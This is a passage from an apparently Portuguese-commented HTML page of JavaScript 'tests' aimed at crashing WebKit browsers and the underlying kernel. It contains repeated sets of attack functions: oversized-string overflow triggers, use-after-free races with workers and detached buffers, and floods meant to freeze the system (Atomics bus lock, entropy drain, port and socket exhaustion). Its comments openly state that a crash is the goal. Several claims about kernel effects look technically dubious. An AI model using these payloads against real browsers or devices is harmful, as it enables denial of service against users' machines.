                        ws.close(); // Race condition
                    };
                    ws.onerror = () => {};
                    
                } catch(e) {}
            }, 10);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Teste Socket parado.");
            }, 5000);
        }

        // --- TESTE 5: Shared Buffer Unmap Panic (Kernel) ---
        function runAtomicsUnmap() {
            log("[KERNEL] Iniciando Atomics Unmap Panic...");
            
            if (!window.SharedArrayBuffer) return log("SAB n√£o suportado.");
            
            const sab = new SharedArrayBuffer(4096);
            const i32 = new Int32Array(sab);
            
            for(let i=0; i<50; i++) {
                const w = new Worker(URL.createObjectURL(new Blob([`
                    onmessage = e => {
                        const i32 = new Int32Array(e.data);
                        Atomics.wait(i32, 0, 0); // Dorme
                    }
                `], {type:"text/javascript"})));
                w.postMessage(sab);
                
                // Mata o worker para desmapear a mem√≥ria enquanto a thread dorme
                setTimeout(() => w.terminate(), 100 + Math.random() * 100);
            }
            
            log("Race iniciada. Aguarde instabilidade.");
        }

        // --- TESTE 6: getaddrinfo Stack Overflow (Kernel) ---
        function runDNSStack() {
            log("[KERNEL] Iniciando DNS Stack Smash...");
            
            const host = "A".repeat(5000);
            
            try {
                log("Resolvendo hostname de 5000 chars...");
                fetch("http://" + host).catch(e => {});
                log("Syscall retornou (Seguro).");
            } catch(e) {
                log("Erro DNS: " + e.message);
            }
        }
function runStrcat() {
            log("[WebKit] Testando op_strcat Overflow...");
            
            try {
                let base = "A";
                const appendages = [];
                // Cria muitas strings para concatenar
                for(let i=0; i<20000; i++) appendages.push("B");
                
                // Objeto malicioso que muda durante a convers√£o
                const trigger = {
                    toString: () => {
                        // Tenta desalocar ou mover mem√≥ria durante o 'strcat'
                        appendages.length = 0; 
                        return "C";
                    }
                };
                
                log("Iniciando concatena√ß√£o massiva...");
                
                // For√ßa op_strcat (operador + ou concat)
                // O motor tenta otimizar isso numa √∫nica opera√ß√£o de aloca√ß√£o
                const res = base.concat(...appendages, trigger);
                
                log("Strcat sobreviveu. Length: " + res.length);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: AsyncGenerator Assertion Fail ---
        function runAsyncAssert() {
            log("[WebKit] Violando Asser√ß√µes de AsyncGenerator...");
            
            async function* gen() {
                yield 1;
                yield 2;
                // Tenta quebrar o estado interno
                throw "AssertBreaker"; 
            }
            
            const g = gen();
            const p = [];
            
            // Enfileira m√∫ltiplas promessas para criar estado complexo na fila
            // O log indicava: @assert(!@asyncGeneratorQueueIsEmpty(generator))
            for(let i=0; i<100; i++) {
                p.push(g.next().catch(e => {}));
            }
            
            // Tenta for√ßar o retorno prematuro enquanto a fila processa
            g.return("FORCE_CLOSE").catch(e => {});
            
            log("Gerador estressado. Aguardando crash...");
        }

        // --- TESTE 3: Import Assertion Stack Smash ---
        function runImportAssert() {
            log("[WebKit] Atacando Import Assertions...");
            
            // Cria um objeto de op√ß√µes com chaves gigantes para estourar o parser
            // Refer√™ncia: "Expected an assertion key" no log
            const hugeKey = "K".repeat(10000);
            const options = { assert: {} };
            options.assert[hugeKey] = "json";
            
            try {
                // Import din√¢mico com asser√ß√µes malformadas
                import("data:text/javascript,console.log('ok')", options)
                    .then(() => log("Import OK (Seguro)."))
                    .catch(e => log("Erro Import: " + e.message));
                    
            } catch(e) {
                log("Erro Cr√≠tico: " + e.message);
            }
        }

        // --- TESTE 4: /dev/urandom Entropy Starvation (Kernel) ---
        function runUrandom() {
            log("[KERNEL] Drenando /dev/urandom...");
            
            const workerCode = `
                setInterval(() => {
                    // Pede 1MB de entropia a cada ms
                    const buf = new Uint8Array(1024 * 1024);
                    crypto.getRandomValues(buf);
                }, 1);
            `;
            const blob = new Blob([workerCode], {type:"text/javascript"});
            const url = URL.createObjectURL(blob);
            
            for(let i=0; i<30; i++) {
                new Worker(url);
            }
            log("30 Workers a consumir criptografia. Sistema deve congelar.");
        }

        // --- TESTE 5: LinkPreconnect Curl Flood (Kernel) ---
        function runPreconnect() {
            log("[KERNEL] Iniciando Preconnect Flood...");
            
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<50; i++) {
                    const link = document.createElement('link');
                    link.rel = 'preconnect';
                    // IPs aleat√≥rios para for√ßar abertura de novos sockets
                    link.href = 'http://127.0.0.' + (count % 255) + ':' + (8000 + i);
                    document.head.appendChild(link);
                    
                    // Remove para n√£o estourar mem√≥ria DOM, mas o socket Kernel pode ficar TIME_WAIT
                    setTimeout(() => document.head.removeChild(link), 100);
                }
                count++;
                
                if (count % 100 === 0) log(`Preconnects: ${count * 50}`);
                if (count > 500) clearInterval(interval);
            }, 50);
        }

        // --- TESTE 6: WebSocket Bind Conflict (Kernel) ---
        function runBindCrash() {
            log("[KERNEL] Testando WebSocket Bind Crash...");
            
            const sockets = [];
            
            // Tenta esgotar portas locais ef√™meras
            const interval = setInterval(() => {
                try {
                    // Conecta a si mesmo para for√ßar loopback r√°pido
                    const ws = new WebSocket("ws://127.0.0.1:9222"); 
                    ws.onerror = () => {};
                    sockets.push(ws);
                    
                    if (sockets.length % 100 === 0) log(`Sockets Bound: ${sockets.length}`);
                } catch(e) {
                    log("Bind falhou: " + e.message);
                    clearInterval(interval);
                }
            }, 5);
        }
// --- TESTE 1: FormData strcat Overflow ---
        // Alvo: A fun√ß√£o 'strcat' insegura encontrada no libc.
        function runFormDataOverflow() {
            log("[WebKit] Iniciando FormData Overflow...");
            
            try {
                const fd = new FormData();
                // Cria um nome de campo gigante (1MB)
                // O WebKit precisa concatenar: "--boundary\r\nContent-Disposition: form-data; name=\"" + NAME + "\""
                const hugeName = "A".repeat(1024 * 1024); 
                
                log("Adicionando campos gigantes...");
                // Adiciona m√∫ltiplos campos para for√ßar v√°rias concatena√ß√µes
                for(let i=0; i<10; i++) {
                    fd.append(hugeName + i, "payload");
                }
                
                log("Serializando FormData (Trigger)...");
                // A serializa√ß√£o ocorre quando enviamos ou lemos
                new Response(fd).text().then(() => {
                    log("FormData processado (Seguro).");
                }).catch(e => log("Erro: " + e));
                
            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 2: AsyncGenerator Queue Assertion Fail ---
        // Alvo: @assert(!@asyncGeneratorQueueIsEmpty(generator))
        function runAsyncGenCrash() {
            log("[WebKit] Atacando AsyncGenerator Queue...");
            
            async function* gen() {
                try {
                    yield 1;
                    yield 2;
                } finally {
                    // Roda quando o gerador fecha/erro
                    // Tenta criar um estado inv√°lido lan√ßando erro durante a limpeza
                    throw "CleanupError";
                }
            }
            
            const g = gen();
            
            // Enche a fila de 'next'
            const p1 = g.next();
            const p2 = g.next();
            
            // Tenta for√ßar um erro na fila
            // throw() deve limpar a fila. Se houver race com os next() pendentes, assertion fail.
            g.throw("ForcedError").catch(e => {});
            
            log("Gerador estressado. Aguarde...");
        }

        // --- TESTE 3: URL Protocol Setter Overflow ---
        // Alvo: Fun√ß√µes de parsing de URL e strings no libc.
        function runURLProtocolCrash() {
            log("[WebKit] Iniciando URL Protocol Overflow...");
            
            try {
                const url = new URL("http://example.com");
                // Protocolo gigante
                const badProto = "a".repeat(10000); 
                
                log("Definindo protocolo gigante...");
                // O setter do protocolo chama fun√ß√µes de string C++
                // Se o buffer tempor√°rio na stack for pequeno, BOOM.
                url.protocol = badProto;
                
                log("URL: " + url.protocol.substring(0, 20) + "...");
                
            } catch(e) {
                log("Erro URL: " + e.message);
            }
        }

        // --- TESTE 4: Crypto Key Storage Exhaustion (Kernel) ---
        // Alvo: O processador de seguran√ßa do sistema.
        function runCryptoExhaustion() {
            log("[KERNEL] Iniciando Crypto Key Flood...");
            
            if (!window.crypto || !window.crypto.subtle) return log("Crypto API off.");
            
            const keys = [];
            let count = 0;
            
            // Gera chaves AES-GCM (usa hardware)
            const interval = setInterval(() => {
                crypto.subtle.generateKey(
                    { name: "AES-GCM", length: 256 },
                    true,
                    ["encrypt", "decrypt"]
                ).then(key => {
                    keys.push(key); // Mant√©m refer√™ncia para ocupar RAM segura
                    count++;
                }).catch(e => {});
                
                if (count % 1000 === 0) log(`Chaves geradas: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Flood finalizado.");
                }
            }, 1);
        }

        // --- TESTE 5: MessagePort Entangle/Close Race (Kernel) ---
        // Alvo: IPC e gest√£o de handles.
        function runPortEntangleRace() {
            log("[KERNEL] Iniciando Entangle/Close Race...");
            
            const ch1 = new MessageChannel();
            const ch2 = new MessageChannel();
            
            // Worker para receber a porta
            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
            
            try {
                // Tenta enviar a porta 2 pela porta 1...
                // E FECHAR a porta 1 ao mesmo tempo.
                // O Kernel tem de decidir se envia ou fecha.
                
                // Loop para aumentar chance de race
                for(let i=0; i<100; i++) {
                    try {
                        ch1.port1.postMessage("race", [ch2.port1]);
                        ch1.port1.close();
                    } catch(e) {}
                }
                
                log("Race loop executado.");
                w.terminate();
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 6: Blob Revoke During Read (Kernel) ---
        // Alvo: VFS (Sistema de Ficheiros Virtual).
        function runBlobRevokeRace() {
            log("[KERNEL] Iniciando Blob Read Race...");
            
            const blob = new Blob(["DATA".repeat(1000)]);
            const url = URL.createObjectURL(blob);
            
            // Worker para ler o blob (thread separada)
            const wCode = `
                onmessage = async (e) => {
                    try {
                        const r = await fetch(e.data);
                        const t = await r.text();
                        postMessage("Lido");
                    } catch(x) { postMessage("Erro"); }
                }
            `;
            const w = new Worker(URL.createObjectURL(new Blob([wCode], {type:"text/javascript"})));
            
            // 1. Manda o worker ler
            w.postMessage(url);
            
            // 2. O GOLPE: Revoga a URL imediatamente na main thread
            // Tenta invalidar o handle enquanto o worker est√° abrindo/lendo
            URL.revokeObjectURL(url);
            
            w.onmessage = e => log("Worker: " + e.data);
            
            // Repete massivamente
            let i = 0;
            const interval = setInterval(() => {
                i++;
                const b = new Blob(["RACE"]);
                const u = URL.createObjectURL(b);
                w.postMessage(u);
                URL.revokeObjectURL(u); // Race!
                
                if (i > 500) {
                    clearInterval(interval);
                    w.terminate();
                    log("Teste finalizado.");
                }
            }, 10);
        }
 // --- TESTE 1: Array.copyWithin Proxy Trap ---
        function runCopyWithinCrash() {
            log("[WebKit] Iniciando copyWithin Trap...");
            
            try {
                const arr = [1, 2, 3, 4, 5];
                
                // Proxy para interceptar a convers√£o de argumentos
                const proxy = new Proxy(arr, {
                    get: function(target, prop) {
                        // copyWithin l√™ 'length' primeiro, depois converte argumentos
                        if (prop === "length") return target.length;
                        
                        // Se tentar ler os valores para copiar...
                        return Reflect.get(target, prop);
                    }
                });

                // Argumento malicioso que zera o array quando lido
                const trigger = {
                    valueOf: function() {
                        log("C++ lendo argumentos. Zerando array...");
                        arr.length = 0; // Liberta a mem√≥ria
                        // Tenta alocar lixo
                        const junk = new Float64Array(1000).fill(1.23);
                        return 0;
                    }
                };

                log("Executando copyWithin...");
                // copyWithin(target, start, end)
                // Se a valida√ß√£o de tamanho ocorrer antes da convers√£o do argumento 'start'...
                // O memmove vai copiar para um buffer morto.
                Array.prototype.copyWithin.call(proxy, trigger, 0);
                
                log("Opera√ß√£o conclu√≠da (Seguro).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: DOMMatrix Stack Smash ---
        function runMatrixSmash() {
            log("[WebKit] Iniciando Matrix Recursion...");
            
            try {
                let m = new DOMMatrix();
                // Matriz complexa para for√ßar c√°lculos pesados
                m.rotateSelf(45).scaleSelf(2); 
                
                function recurse(depth) {
                    if (depth > 5000) { // Limite de stack nativa
                        log("Limite atingido.");
                        return;
                    }
                    // Multiplica√ß√£o de matriz √© pesada na stack
                    m.multiplySelf(m); 
                    recurse(depth + 1);
                }
                
                log("Multiplicando matrizes recursivamente...");
                recurse(0);
                log("Matrix Engine sobreviveu.");
                
            } catch(e) {
                log("Erro Matrix: " + e.message);
            }
        }

        // --- TESTE 3: JSON Parser Array Hole UAF ---
        function runJSONHole() {
            log("[WebKit] Iniciando JSON Hole UAF...");
            
            // Cria JSON com array
            const json = '[0, 1, 2, 3, 4, 5]';
            
            try {
                JSON.parse(json, (key, value) => {
                    // O reviver √© chamado para cada elemento.
                    // O array ainda est√° sendo constru√≠do.
                    if (key == "2") {
                        log("Reviver no √≠ndice 2. Deletando √≠ndice 3...");
                        // Tenta acessar o objeto pai (o array em constru√ß√£o)
                        // Nota: 'this' no reviver √© o objeto que cont√©m a propriedade
                        delete this[3]; // Cria um buraco
                        
                        // Se o parser C++ j√° tinha reservado espa√ßo e tenta escrever no √≠ndice 3
                        // mas a estrutura mudou de Array Denso para Array Esparso (Dictionary),
                        // pode haver corrup√ß√£o.
                    }
                    return value;
                });
                log("JSON Parse seguro.");
            } catch(e) {
                log("Erro JSON: " + e.message);
            }
        }

        // --- TESTE 4: Atomics Bus Lock Flood (Kernel) ---
        function runAtomicFlood() {
            log("[KERNEL] Iniciando Atomics Bus Lock Flood...");
            
            if (!window.SharedArrayBuffer) return log("SAB Off.");
            
            const sab = new SharedArrayBuffer(4);
            const i32 = new Int32Array(sab);
            
            const workerCode = `
                onmessage = e => {
                    const i32 = new Int32Array(e.data);
                    while(true) {
                        // Exchange √© uma instru√ß√£o at√≥mica pesada (LOCK prefix em x86)
                        // Fazer isso em loop infinito trava o barramento de mem√≥ria
                        Atomics.exchange(i32, 0, 1);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lan√ßa o m√°ximo de threads poss√≠vel (ex: 50)
            for(let i=0; i<50; i++) {
                new Worker(url).postMessage(sab);
            }
            
            log("50 Threads a martelar o endere√ßo 0x0.");
            log("Se o cursor do mouse parar, √© Hard Freeze.");
        }

        // --- TESTE 5: Blob Cluster Chain Stack Smash (Kernel) ---
        function runBlobDeep() {
            log("[KERNEL] Construindo Blob Infinito...");
            
            let b = new Blob(["base"]);
            // 10.000 camadas. O Kernel precisa resolver a lista de ponteiros.
            for(let i=0; i<10000; i++) {
                b = new Blob([b]);
            }
            
            log("Blob criado. Lendo...");
            
            // A leitura for√ßa o Kernel a percorrer a estrutura
            const fr = new FileReader();
            fr.readAsText(b);
            
            fr.onerror = () => log("Erro Leitura (VFS Safe).");
            fr.onload = () => log("Leitura OK.");
        }

        // --- TESTE 6: MessagePort Ping-Pong Death (Kernel) ---
        function runIPCPingPong() {
            log("[KERNEL] Iniciando Ping-Pong Death...");
            
            const ch = new MessageChannel();
            const p1 = ch.port1;
            const p2 = ch.port2;
            
            // Configura loop fechado
            p1.onmessage = e => p1.postMessage("ping");
            p2.onmessage = e => p2.postMessage("pong");
            
            // Inicia
            log("Bola em jogo...");
            p1.postMessage("start");
            
            // Deixa rodar e tenta interferir
            setTimeout(() => {
                log("Tentando fechar portas sob carga m√°xima...");
                // Fechar portas enquanto o buffer est√° cheio de mensagens pendentes
                // estressa o destruidor de IPC do Kernel.
                p1.close();
                p2.close();
                log("Teste finalizado.");
            }, 5000);
        }
 // --- TESTE 1: String.link 'strcat' Overflow ---
        function runLinkStrcat() {
            log("[WebKit] Iniciando String.link Overflow...");
            
            try {
                // Cria string gigante
                const huge = "A".repeat(1024 * 1024 * 5); // 5MB
                
                log("Gerando HTML via m√©todo legado...");
                // O m√©todo .link() gera <a href="...">...</a>
                // Implementa√ß√µes antigas usam buffer fixo ou strcat inseguro para montar a tag
                const res = huge.link("http://test.com/" + huge);
                
                log("Opera√ß√£o conclu√≠da (Length: " + res.length + ")");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: DataView 'realloc' UAF ---
        function runDataViewRealloc() {
            log("[WebKit] Iniciando DataView Realloc Race...");
            
            const buffer = new ArrayBuffer(1024);
            const view = new DataView(buffer);
            
            try {
                // Worker para tentar "roubar" (transferir) o buffer
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                
                // Loop de leitura
                for(let i=0; i<1000; i++) {
                    // Tenta ler
                    const v = view.getUint8(0);
                    
                    // O GOLPE: Transfere no meio do loop
                    if (i === 500) {
                        log("Transferindo buffer...");
                        w.postMessage(buffer, [buffer]);
                    }
                }
                log("Race finalizada.");
                w.terminate();
                
            } catch(e) {
                // TypeError: Detached buffer √© o esperado (seguro)
                // Crash √© o objetivo
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 3: RegExp Group Name Stack Smash ---
        function runRegexGroupSmash() {
            log("[WebKit] Iniciando Regex Group Name Smash...");
            
            try {
                // Nome de grupo gigante
                const groupName = "G" + "A".repeat(5000);
                const pattern = `(?<${groupName}>a)`;
                
                log("Compilando Regex com nome de grupo de 5KB...");
                // O parser tem de ler e armazenar o nome do grupo.
                // Se usar stack buffer (char name[256]), estoura.
                const re = new RegExp(pattern);
                
                log("Regex compilada (Seguro).");
                
            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }

        // --- TESTE 4: Socket 'bind' Port Exhaustion (Kernel) ---
        function runBindExhaustion() {
            log("[KERNEL] Iniciando Bind Exhaustion...");
            
            // Tenta criar servidores ou conex√µes que ocupam portas locais
            // WebRTC DataChannels criam portas UDP locais
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const conns = [];
            let count = 0;
            
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) {
                    const pc = new RTCPeerConnection({iceServers:[]});
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
                    conns.push(pc);
                    count++;
                }
                
                if (count % 100 === 0) log(`Portas UDP alocadas: ${count}`);
                
                if (count > 2000) {
                    clearInterval(interval);
                    log("Teste pausado. Verifique rede.");
                }
            }, 50);
        }

        // --- TESTE 5: Console 'malloc' Fragmentation (Kernel) ---
        function runConsoleMalloc() {
            log("[KERNEL] Iniciando Console Malloc Flood...");
            
            // Usa console.count para alocar strings √∫nicas no heap de debug
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<1000; i++) {
                    // Cada label √∫nica aloca mem√≥ria nova
                    console.count("LBL_" + Math.random() + "_" + count);
                    count++;
                }
                
                if (count % 10000 === 0) log(`Labels alocadas: ${count}`);
                
                if (count > 200000) {
                    clearInterval(interval);
                    log("Flood finalizado.");
                }
            }, 10);
        }

        // --- TESTE 6: FileReader IO Race (Kernel) ---
        function runFileRace() {
            log("[KERNEL] Iniciando FileReader IO Race...");
            
            const blob = new Blob([new Array(1024*1024).join("A")]);
            
            // Worker com FileReaderSync
            const wCode = `
                onmessage = e => {
                    try {
                        const reader = new FileReaderSync();
                        while(true) reader.readAsText(e.data);
                    } catch(x){}
                }
            `;
            const w = new Worker(URL.createObjectURL(new Blob([wCode], {type:"text/js"})));
            
            // Main thread com FileReader Async
            const reader = new FileReader();
            
            log("Iniciando leitura concorrente...");
            w.postMessage(blob);
            
            let i = 0;
            function loop() {
                reader.readAsText(blob);
                i++;
                if (i < 100) setTimeout(loop, 10);
                else {
                    w.terminate();
                    log("Race IO finalizada.");
                }
            }
            loop();
        }
 // --- TESTE 1: Cookie Buffer Overflow (strcat) ---
        function runCookieOverflow() {
            log("[WebKit] Iniciando Cookie Overflow...");
            
            try {
                // Tenta criar um cookie de 64KB (limite comum √© 4KB)
                // Se o buffer interno for fixo e usar strcat, ocorre overflow
                const hugeCookie = "crash=" + "A".repeat(65000);
                
                log("Definindo cookie gigante...");
                document.cookie = hugeCookie;
                
                // Verifica se foi truncado ou se corrompeu
                if (document.cookie.length > 4096) {
                    log("Cookie gigante aceite (Perigo de Heap Overflow).");
                } else {
                    log("Cookie truncado (Seguro).");
                }
                
            } catch(e) {
                log("Erro Cookie: " + e.message);
            }
        }

        // --- TESTE 2: Window.name IPC Overflow ---
        function runWindowNameCrash() {
            log("[WebKit] Iniciando Window Name IPC Overflow...");
            
            try {
                // String de 10MB
                const hugeName = "B".repeat(10 * 1024 * 1024);
                
                log("Definindo window.name (10MB)...");
                // window.name √© sincronizado com o processo UI
                window.name = hugeName;
                
                log("Opera√ß√£o conclu√≠da. Verifique estabilidade da aba.");
                
            } catch(e) {
                log("Erro Window: " + e.message);
            }
        }

        // --- TESTE 3: Date.parse Stack Smash ---
        function runDateParseStack() {
            log("[WebKit] Iniciando Date.parse Stack Smash...");
            
            try {
                // Cria string de data com milhares de separadores
                // For√ßa recurs√£o no parser de data
                const badDate = "1/" .repeat(20000) + "2024";
                
                log("Parseando data malformada...");
                Date.parse(badDate);
                
                log("Date.parse sobreviveu.");
            } catch(e) {
                log("Erro Date: " + e.message);
            }
        }

        // --- TESTE 4: Cache Name Path Overflow (Kernel) ---
        function runCachePathOverflow() {
            log("[KERNEL] Iniciando Cache Path Overflow...");
            
            if (!window.caches) return log("Cache API off.");
            
            // Nome maior que PATH_MAX (4096)
            const hugeName = "C".repeat(5000);
            
            caches.open(hugeName).then(() => {
                log("Cache criado (VFS aceitou nome gigante).");
            }).catch(e => {
                // Erro de sistema ou SecurityError
                log("Resultado VFS: " + e.message);
            });
        }

        // --- TESTE 5: Transfer List Handle Exhaustion (Kernel) ---
        function runTransferFlood() {
            log("[KERNEL] Iniciando Transfer List Flood...");
            
            const channel = new MessageChannel();
            const buffers = [];
            
            // Aloca 10.000 buffers vazios
            for(let i=0; i<10000; i++) buffers.push(new ArrayBuffer(8));
            
            try {
                log("Transferindo 10.000 handles de uma vez...");
                // O Kernel tem de validar e mover ownership de todos numa syscall
                // Se a lista for copiada para a Stack do Kernel -> Panic
                channel.port1.postMessage("flood", buffers);
                
                log("Transfer√™ncia aceite (Kernel Stack robusta).");
            } catch(e) {
                log("Erro Transfer: " + e.message);
            }
        }

        // --- TESTE 6: Console Debug Ring Buffer Flood (Kernel) ---
        function runDebugFlood() {
            log("[KERNEL] Iniciando Debug Ring Buffer Flood...");
            
            const workerCode = `
                setInterval(() => {
                    // Dados bin√°rios/lixo para confundir o parser de log
                    const junk = String.fromCharCode(...new Uint8Array(1000).map(()=>Math.random()*255));
                    console.debug(junk);
                }, 1);
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<20; i++) new Worker(url);
            
            log("20 Workers em console.debug. Verifique dmesg/estabilidade.");
        }



    </script>
</body>
</html>
